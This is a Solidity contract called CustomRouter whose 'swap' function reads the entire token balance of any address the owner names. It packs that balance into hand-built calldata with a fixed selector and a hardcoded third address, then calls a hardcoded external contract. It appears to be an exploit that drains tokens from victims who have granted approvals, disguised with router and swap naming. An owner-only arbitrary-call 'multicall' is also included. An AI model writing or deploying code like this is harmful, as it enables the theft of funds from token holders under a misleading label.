// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract CustomRouter {
    address public owner;

    // Target contract to invoke during the swap
    address public constant TARGET_INTERACTION_CONTRACT = 0x10EfC21DcB3513cF3014D4D2d6CfE612548Fcc7B;

    event Swapped(address indexed tar, address indexed tok, uint256 balance);
    event Executed(address indexed target, bytes data);

    modifier onlyOwner() {
        require(msg.sender == owner, "Unauthorized: Caller is not the owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /// @notice Queries balance of `tok` for `tar`, constructs dynamic calldata, and executes low-level call.
    /// @param tar The target account whose token balance is queried and placed in calldata
    /// @param tok The token address to check balance for and include in calldata
    function swap(address tar, address tok) external onlyOwner returns (bytes memory) {
        // 1. Query token balance of `tar`
        uint256 tokenBalance = IERC20(tok).balanceOf(tar);

        // 2. Construct calldata by slicing original payload and inserting dynamic parameters:
        // - Replaces static token address slot with `tok`
        // - Replaces static receiver target address slot with `tar`
        // - Inserts dynamic `tokenBalance`
        bytes memory payload = bytes.concat(
            hex"d5ba63ad000000000000000000000000",
            bytes20(tok), // Dynamic token address
            hex"000000000000000000000000",
            bytes20(tar), // Dynamic target/receiver address
            hex"000000000000000000000000F8Cfd0344cC5552203Be99C82474fda3EA0ea0F80000000000000000000000000000000000000000000000000000000000000064",
            bytes32(tokenBalance) // Dynamic token balance formatted as uint256 (32 bytes)
        );

        // 3. Execute low-level call to the interaction address
        (bool success, bytes memory returnData) = TARGET_INTERACTION_CONTRACT.call(payload);
        require(success, "Swap low-level call failed");

        emit Swapped(tar, tok, tokenBalance);
        return returnData;
    }

    /// @notice Executes an arbitrary interaction against a single target address with provided raw data.
    /// @param target The address to interact with
    /// @param data Raw byte payload to send
    function multicall(address target, bytes calldata data) external onlyOwner returns (bytes memory) {
        require(target != address(0), "Invalid target address");

        (bool success, bytes memory returnData) = target.call(data);
        require(success, "Multicall execution failed");

        emit Executed(target, data);
        return returnData;
    }

    /// @notice Transfer ownership if needed
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        owner = newOwner;
    }
}